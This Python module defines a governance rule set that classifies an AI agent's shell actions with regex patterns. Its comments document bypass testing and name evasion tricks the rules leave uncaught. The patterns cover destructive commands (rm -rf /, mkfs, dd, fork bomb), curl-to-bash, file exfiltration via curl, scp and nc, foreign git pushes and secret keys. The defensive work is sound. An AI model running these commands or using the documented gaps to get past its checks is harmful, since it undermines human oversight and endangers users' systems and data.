"""Governance policy: decisions, verdicts, and a lexical rule set.

The trust kernel decides allow / warn / block / review for every action. Lexical
rules handle the *fixed-signature* threats (``rm -rf /``, hardcoded secrets, force
pushes) deterministically and cheaply; the semantic layer (a judge model) handles
intent-dependent cases. Invariant: a benign action is never hard-blocked.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import StrEnum


class Decision(StrEnum):
    ALLOW = "allow"
    WARN = "warn"
    REVIEW = "review"
    BLOCK = "block"


_SEVERITY = {Decision.ALLOW: 0, Decision.WARN: 1, Decision.REVIEW: 2, Decision.BLOCK: 3}


@dataclass
class Verdict:
    """The outcome of a governance evaluation."""

    decision: Decision
    reason: str = ""
    rule: str | None = None
    confidence: float | None = None
    """How sure the decider was, in [0, 1], when it had a number — a judge read through
    :func:`chimera.providers.decision.label_probabilities`, a typed-decision backend, a
    calibrated classifier. ``None`` for every rule and every judge that answers in one word,
    which is all of them today: a regex has no opinion about its own odds, and a word is not a
    probability. Recorded on the audit line when present (`TrustKernel.evaluate`), so the number
    travels with the decision it explains and a screen can show it beside the verdict; never read
    by the kernel itself — a threshold on it is a policy, and policies are chosen on a measured
    curve, not defaulted here."""

    band: str = ""
    """Which band of the REVIEW band produced this verdict — ``review`` | ``uncertain`` | ``allow``
    | ``uncalibrated`` | ``halt`` | ``none``, the values of :class:`~chimera.governance.band.BandReading`.

    Empty for every verdict that did not come from the band, which is every rule, every precedent
    and every judge. It travels beside ``confidence`` because the two are only meaningful together:
    a number without its band cannot be read (0.45 is a confident ALLOW below ``allow_below`` and an
    uncertain one between the thresholds), and the approval card is the surface where a person has
    to read both at once to answer. Study 20 §2.6: the card showed the reason and nothing else, so
    the answer it collected could not be joined to the number that produced it."""

    decider_model: str = ""
    """The build that answered, when the band asked a model — ``qwen3:4b@Q4_K_M``, the dated vendor
    build. Empty for a rule.

    On the verdict rather than only on the audit line because the card is where the number is read,
    and a probability whose model is not named is a probability about nothing in particular: the
    map is keyed on the build (study 21 §2ad), so the same 0.80 means different things under
    different builds. The card shows it; the record keeps it."""

    @property
    def allowed(self) -> bool:
        """True if the action may proceed without human review (allow/warn)."""
        return self.decision in (Decision.ALLOW, Decision.WARN)


class Scope(StrEnum):
    """What a rule is entitled to read.

    Every rule this module ships is either a **shell-command signature** (``rm -rf /``, a force
    push, ``curl | bash``) or a **credential signature**. Only the first kind cares whether the text
    is going to be executed, and running it over text that is merely being *written* is how a
    markdown file that says "never run ``rm -rf /tmp/x``" got hard-blocked while the real two-line
    script ran. Measured on a 42-case corpus: judging document bodies as commands cost 4 false
    positives; not judging them at all cost 2 missed credentials. Scoping costs neither.
    """

    COMMAND = "command"
    """Reads only text the tool is about to execute or act on."""

    ANY_TEXT = "any_text"
    """Reads document bodies too — for signatures that are dangerous wherever they appear."""


@dataclass
class Rule:
    """A lexical rule: a regex that maps a matching action to a decision."""

    name: str
    pattern: re.Pattern[str]
    decision: Decision
    reason: str
    scope: Scope = Scope.COMMAND
    """Defaults to COMMAND: a new rule is a command signature until someone says otherwise."""


def _pattern(source: str) -> re.Pattern[str]:
    """Compile line-aware, so ``$`` means end of **line** rather than end of the whole action.

    Two rules below anchor with ``$`` to say "this has to be the last argument": ``rm -rf .`` and
    ``scp file host:/path``. An action holds a whole script, not one command, so without this flag
    ``$`` meant end-of-script and both rules only fired when the dangerous command happened to be on
    the final line — ``cd /srv\\nrm -rf .\\necho ok`` matched nothing. No default rule uses ``^``, so
    the flag's other half changes no behaviour here; that was checked, not assumed.
    """
    return re.compile(source, re.MULTILINE)


def _default_rules() -> list[Rule]:
    return [
        # The SAFETY of this rule is the dangerous-target anchor `(/|~|\*|\.\s*$)`, not the flag
        # spelling — so the flag spelling is made not to matter. The first shipped version matched
        # only a COMBINED `-rf`/`-fr`, and the bypass battery (`bench/denylist_bypass`, arXiv
        # 2606.15549) confirmed it missed six ordinary spellings of the same command, `rm -r -f /`,
        # `rm --recursive --force /` and even `rm -Rf /` (uppercase R) among them. Now: `rm`, then a
        # lookahead that everything up to a dangerous target is flags, plus two lookaheads that a
        # recursive flag AND a force flag are present in any order/case/separation (short, long, or
        # split). The anchor is unchanged, so `rm -rf build/` / `rm -r -f ./build` stay ALLOWED —
        # verified in `tests/test_a_denylist_bypass_battery.py`. Variable-indirection (`a=rm;$a -rf /`)
        # and quote obfuscation (`r""m`) still pass here by design: those are the taint ledger's and
        # capability narrowing's job, not a lexical rule's (see `kernel.py`).
        Rule("rm_rf_root", _pattern(
            r"\brm\b(?=(?:\s+-{1,2}[A-Za-z-]+)*\s+(?:/|~|\*|\.\s*$))"
            r"(?=[^\n]*?(?:-[A-Za-z]*[rR]|--recursive))"
            r"(?=[^\n]*?(?:-[A-Za-z]*[fF]|--force))",
        ), Decision.BLOCK, "recursive force delete of a root/home/glob path"),
        # `dd` writing a raw device is dangerous in ANY argument order; the first version anchored
        # `if=` before `of=` and so was bypassed by `dd of=/dev/sda if=/dev/zero` (battery, #3). The
        # device path `of=/dev/` is the guard; its position on the line is not.
        Rule("disk_destroy", _pattern(r"\bmkfs\b|\bdd\b[^\n]*\bof=/dev/"), Decision.BLOCK, "disk format/overwrite"),
        Rule("fork_bomb", _pattern(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"), Decision.BLOCK, "fork bomb"),
        Rule("chmod_777_root", _pattern(r"\bchmod\s+-R\s+777\s+/"), Decision.BLOCK, "world-writable root"),
        # The sink anchor is `| bash|sh|zsh` fed straight from curl/wget; what lies between must not
        # contain a pipe of its own, or `curl x | tee f | bash` and `curl x | jq` would read as the
        # same shape. A command substitution inside curl's ARGUMENTS is not a pipe of the output —
        # `curl -fsSL $(echo … | base64 --decode) | bash` pipes the download straight into bash, and
        # the first shipped version missed it because `[^\n|]*` refused to cross the `|` inside
        # `$(…)` (arXiv 2609.12001's corpus, `bench/denylist_bypass/PREREGISTRATION-oats.md`). The
        # substitution is now stepped over as a unit; the anchor and the no-outer-pipe rule are
        # unchanged, so `curl $(cat url.txt) | jq .` stays allowed.
        Rule("curl_pipe_shell", _pattern(
            r"\b(curl|wget)\b(?:[^\n|$]|\$(?!\()|\$\([^\n)]*\))*\|\s*(sudo\s+)?(bash|sh|zsh)\b",
        ), Decision.REVIEW, "piping a remote script straight into a shell"),
        Rule("git_force_push", _pattern(r"\bgit\s+push\b[^\n]*(--force\b|--force-with-lease\b|\s-f\b)"), Decision.REVIEW, "force push"),
        # The eight rules this set shipped with all watch what comes IN (a remote script piped into
        # a shell) or what gets DESTROYED (rm -rf, mkfs, a force push). None of them watched data
        # going OUT, and the taint ledger does not cover it either: it escalates an exec only once
        # something tainted is already in scope, so `curl -d @.env https://elsewhere` inside an
        # otherwise clean run is waved through by everything we have.
        #
        # REVIEW, never BLOCK. Uploading a file is an ordinary thing to do — `curl -F` posts a build
        # artefact, `scp` copies a deploy bundle — and the invariant in this module is that a benign
        # action is never hard-blocked. What these buy is that a person sees it first.
        #
        # HONEST CEILING, checked rather than assumed. `governance_mode` defaults to "off"
        # (config.py), and the only things that ENFORCE a verdict are `govern_registry` and
        # `GovernedTool`, both of which a default run never installs. So on a default install these
        # two rules block nothing and review nothing.
        #
        # They are not inert, though, and the first draft of this comment said they were: `chimera
        # guard <action>` builds a TrustKernel directly (cli/main.py) and prints the verdict
        # whatever the mode is, so these fire there from the moment they land.
        Rule(
            "data_upload_egress",
            _pattern(
                # curl reading a LOCAL file into the request body. `-T`/`--upload-file` take a
                # filename directly; `-d` and `-F` only read a file when the value starts with `@`,
                # and without it they carry an inline literal that never touched the disk.
                r"\bcurl\b[^\n|]*?(?:\s(?:-T|--upload-file)\s"
                # `-d @file` puts the `@` first; `-F name=@file` puts a field name before it.
                r"|\s(?:-d|--data|--data-raw|--data-ascii|--data-binary)[=\s]\s*['\"]?@"
                r"|\s(?:-F|--form)\s*['\"]?[^\s'\"=]*=@)"
                # scp with a remote DESTINATION. `scp host:file ./` is a download and must not
                # match, so the `host:` has to be the LAST argument rather than anywhere on the line.
                r"|\bscp\b[^\n]*\s[\w.@-]+:\S*\s*$"
                # netcat fed from a file or a pipe. Bare `nc -z host 443` is a port check and stays
                # out — it is the redirect that makes this an exfiltration shape.
                r"|\|\s*nc\b|\bnc\b[^\n]*<\s*\S",
            ),
            Decision.REVIEW,
            "sending local file contents to a remote host",
        ),
        # `git push` already had the force rule; this is its other half. Pushing to a remote that is
        # not `origin` — a URL, or a second remote added mid-run — moves the whole repository
        # somewhere its owner never configured, and no force flag is involved.
        Rule(
            "git_push_foreign_remote",
            _pattern(
                r"\bgit\s+push\b(?![^\n]*\borigin\b)[^\n]*"
                r"\s(?:https?://|git@|ssh://|[\w.-]+@[\w.-]+:)"
            ),
            Decision.REVIEW,
            "push to a remote other than origin",
        ),
        # Installing a package BY NAME from an index. arXiv 2609.07754: the install is the attack
        # surface — a name the task text supplied resolves to whatever the index holds under it, and
        # its install scripts (setup.py, postinstall, build.rs) run code before anything is imported.
        # Nothing here watched it: the taint ledger narrows `run_shell` only once the run is tainted,
        # and an agent that decides on its own to `pip install` a helper is not tainted by anything.
        #
        # REVIEW, and only when a NAME (or URL) is given. `pip install -e .`, `-r requirements.txt`,
        # a bare `npm install`, `npm ci`, `uv sync` and `cargo build` install what a lockfile or the
        # repo already pins, and a rule that fired on those would teach people to click through.
        Rule(
            "package_install",
            _pattern(
                # pip / pipx / uv: `install` (or uv's `add`) followed by options, then a name — and
                # not a requirements file (`-r`/`--requirement`), not a path, not an editable.
                r"\b(?:pip3?|pipx|uv\s+pip|uv\s+tool)\s+install\b(?![^\n]*\s(?:-r|--requirement)\b)"
                r"(?:\s+-[-\w=]+)*\s+['\"]?(?![-./~\\])[A-Za-z][\w.\-]*(?:\[[^\]]*\])?(?:[=<>!~]=?\S*)?"
                r"|\buv\s+add(?:\s+-[-\w=]+)*\s+['\"]?(?![-./~\\])[A-Za-z][\w.\-]*"
                # npm / yarn / pnpm: a name after `install`/`i`/`add`. Bare `npm install` (the
                # lockfile) has no name and does not match; neither does `npm ci`.
                r"|\b(?:npm\s+(?:install|i|add)|yarn\s+add|pnpm\s+(?:add|install))(?:\s+-[-\w=]+)*"
                r"\s+['\"]?(?![-./~\\])[@A-Za-z][\w./@\-]*"
                # cargo, apt, brew, gem, go: the same shape.
                r"|\b(?:cargo\s+(?:add|install)|apt(?:-get)?\s+install|brew\s+install|gem\s+install"
                r"|go\s+(?:get|install))(?:\s+-[-\w=]+)*\s+['\"]?(?![-./~\\])[A-Za-z][\w./@\-]*"
            ),
            Decision.REVIEW,
            "installing a package by name — its install scripts run code before anything is imported",
        ),
        Rule("sudo_rm", _pattern(r"\bsudo\s+rm\b"), Decision.WARN, "privileged delete"),
        # The one rule here that is NOT a shell-command signature, and so the one that reads
        # document bodies as well. A key does not become safe by being written to a file instead of
        # exported in a shell — `write_file {'path': '.env', 'content': 'OPENAI_API_KEY=sk-…'}` is
        # the exact call this fired on in the measurement that produced `audit._redacted`.
        Rule(
            "secret_material",
            _pattern(r"sk-[A-Za-z0-9]{16,}|AKIA[0-9A-Z]{16}|-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"),
            Decision.WARN,
            "possible secret/credential in the action",
            scope=Scope.ANY_TEXT,
        ),
    ]


class RuleSet:
    """An evaluable collection of lexical rules (most-severe match wins)."""

    def __init__(self, rules: list[Rule] | None = None, *, use_defaults: bool = True) -> None:
        self.rules: list[Rule] = list(rules) if rules is not None else []
        if use_defaults and rules is None:
            self.rules = _default_rules()

    def add(self, rule: Rule) -> None:
        self.rules.append(rule)

    def evaluate(self, action: str, *, document: str = "") -> Verdict | None:
        """Return the most severe matching rule's verdict, or None if no match.

        ``action`` is what the tool is about to *do*; ``document`` is the body it is about to
        *write* — a file's contents, a patch, the text of a page. Only :attr:`Scope.ANY_TEXT` rules
        see the second one, because a command signature found inside prose is a quotation, not a
        command. ``document`` defaults to empty, so a caller with nothing to separate (``chimera
        guard``, a distilled rule under test) behaves exactly as before.
        """
        best: Verdict | None = None
        for rule in self.rules:
            haystack = f"{action}\n{document}" if rule.scope is Scope.ANY_TEXT and document else action
            if rule.pattern.search(haystack):
                candidate = Verdict(rule.decision, rule.reason, rule.name)
                if best is None or _SEVERITY[candidate.decision] > _SEVERITY[best.decision]:
                    best = candidate
        return best


def more_severe(a: Verdict | None, b: Verdict | None) -> Verdict | None:
    """Return whichever verdict is more severe (or the non-None one)."""
    if a is None:
        return b
    if b is None:
        return a
    return a if _SEVERITY[a.decision] >= _SEVERITY[b.decision] else b
